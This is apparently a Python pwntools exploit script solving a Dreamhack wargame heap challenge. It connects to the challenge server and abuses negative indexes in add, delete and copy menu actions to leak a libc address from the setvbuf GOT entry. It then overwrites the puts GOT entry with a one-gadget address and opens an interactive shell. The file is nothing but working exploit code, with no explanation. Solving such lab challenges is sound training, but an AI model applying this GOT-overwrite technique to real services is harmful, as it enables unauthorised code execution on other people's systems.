from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 20183
r = remote(HOST, PORT)

def add(idx, data, _=0, n1=0, n2=0):
    r.sendlineafter(b'> ', b'1 %d'%_)
    if _ != 0:
        __(n1, n2)
    r.sendlineafter(b'index : ', b'%d'%idx)
    r.sendline(data)

def delete(idx, _=0):
    r.sendlineafter(b'> ', b'2 %d'%_)
    r.sendlineafter(b'index : ', b'%d'%idx)

def view(_=0):
    r.sendlineafter(b'> ', b'3 %d'%_)

def edit(data, _=0, n1=0, n2=0):
    r.sendlineafter(b'> ', b'4 %d'%_)
    if _ != 0:
        __(n1, n2)
    r.sendline(data)

def copy(idx, _=0, n1=0, n2=0):
    r.sendlineafter(b'> ', b'5 %d'%_)
    if _ != 0:
        __(n1, n2)
    r.sendlineafter(b': ', b'%d'%idx)

def __(n1, n2):
    r.sendline(str(n1).encode())
    r.sendline(str(n2).encode())

setvbuf_got = 0x602048
puts_got = 0x602020

add(0, p64(0x41414141))
delete(-6)
copy(0, _=1, n1=1, n2=setvbuf_got)
view()

r.recvuntil(b': ')
libc = u64(r.recvline().strip().ljust(8,b'\x00'))-0x812a0
system = libc+0x4f420
sh = libc +0x10a2fc

add(0, p64(0x41414141))
delete(-6)
copy(0, _=1, n1=1, n2=puts_got-8)
delete(0)
edit(b'A'*8+p64(sh))
r.interactive()